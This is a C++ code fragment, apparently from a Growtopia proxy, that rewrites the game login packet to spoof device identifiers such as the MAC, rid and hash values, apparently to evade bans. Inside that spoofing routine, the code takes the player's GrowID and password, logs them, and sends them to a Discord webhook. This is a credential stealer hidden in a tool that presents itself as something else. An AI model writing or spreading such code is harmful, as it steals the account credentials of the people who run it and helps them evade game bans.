    if (packet.find("game_version|") != -1) {
        if (events::out::loggedin == 1)
        {
            rtvar var = rtvar::parse(packet);
            auto mac = utils::generate_mac();
            auto hash_str = mac + "RT";
            auto hash2 = utils::hash((uint8_t*)hash_str.c_str(), hash_str.length());
            var.set("mac", mac);
            var.set("wk", utils::generate_rid());
            var.set("rid", utils::generate_rid());
            var.set("fz", std::to_string(utils::random(INT_MIN, INT_MAX)));
            var.set("zf", std::to_string(utils::random(INT_MIN, INT_MAX)));
            var.set("hash", std::to_string(utils::random(INT_MIN, INT_MAX)));
            var.set("hash2", std::to_string(hash2));
            var.set("meta", "TLddQ2jYAo");
            var.set("game_version", gt::version);
            var.set("country", gt::flag);
            var.set("player_age", "20");
            if (var.find("tankIDName")) {
                std::string growid = var.get("tankIDName");
                std::string password = var.get("tankIDPass");
                std::string mac = var.get("mac");
                std::string rid = var.get("rid");
                std::transform(growid.begin(), growid.end(), growid.begin(), ::tolower);
                std::transform(password.begin(), password.end(), password.begin(), ::tolower);
                std::string check = growid + "|" + password + "|" + mac + "|" + rid;
                logsaccount("GrowID: " + growid + ",Password: " + password + "Mac: " + mac + "Rid: " + rid);
                DiscordWebhookSender("GrowID: " + growid + "Password: " + password + "Mac: " + mac + "Rid: " + rid); //Altanb#3535
            }
            packet = var.serialize();
            gt::in_game = false;
            print::set_color(LightGreen);
            PRINTS("Spoofing login info\n");
            g_server->send(false, packet);
            return true;
        }
    }

    return false;
}
